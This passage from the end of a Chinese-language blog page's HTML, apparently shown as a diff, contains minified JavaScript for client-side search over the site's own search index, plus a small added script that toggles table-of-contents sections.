query=this.value.trim();if(query){window.location.href='/search?q='+encodeURIComponent(query);}else{alert('请输入搜索关键词');}}});const searchBtn=document.querySelector('.search-btn');if(searchBtn){searchBtn.addEventListener('click',function(e){e.preventDefault();const query=searchInput.value.trim();if(query){window.location.href='/search?q='+encodeURIComponent(query);}else{alert('请输入搜索关键词');}});}}initSearchOnPage();initCodeHighlighting();});function initSearchOnPage(){const searchResults=document.getElementById('search-results');if(!searchResults)return;const params=new URLSearchParams(window.location.search);const query=params.get('q');if(query){searchResults.innerHTML='<div class="loading">搜索中...</div>';performSearch(query,searchResults);}else{searchResults.innerHTML='<div class="no-results">请在顶部搜索框输入关键词搜索文章</div>';}}function performSearch(query,container){if(!container){container=document.getElementById('search-results');}fetch('/search.json').then(response=>response.json()).then(data=>{const results=data.filter(item=>{const searchText=(item.title+''+item.excerpt+''+item.tags.join('')).toLowerCase();return searchText.includes(query.toLowerCase());});displaySearchResults(results,container);}).catch(err=>{console.log('Search error:',err);container.innerHTML='<div class="no-results">搜索加载失败，请刷新页面重试</div>';});}function displaySearchResults(results,container){if(!container){container=document.getElementById('search-results');}if(!container)return;if(results.length===0){container.innerHTML='<div class="no-results">没有找到相关文章</div>';return;}container.innerHTML=results.map(result=>`<article class="post-card fade-in"><h2 class="post-title"><a href="${result.url}">${result.title}</a></h2><div class="post-excerpt"><p>${result.excerpt ||''}</p></div><a href="${result.url}" class="read-more">阅读全文<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"></path></svg></a></article>`).join('');}function handleSearchClick(btn){const searchInput=document.querySelector('.search-input');if(searchInput){const query=searchInput.value.trim();if(query){window.location.href='/search?q='+encodeURIComponent(query);}else{alert('请输入搜索关键词');}}}function initCodeHighlighting(){}function getUrlParams(){const params=new URLSearchParams(window.location.search);const urlParams={};for(const[key,value]of params){urlParams[key]=value;}return urlParams;}</script>
+  
+    <script>
+      function toggleTocSection(btn) {
+        btn.classList.toggle('collapsed');
+        const sublist = btn.closest('.toc-item').querySelector('.toc-sublist');
+        if (sublist) {
+          sublist.classList.toggle('collapsed');
+        }
+      }
+    </script>
+  
+</body>
+</html>
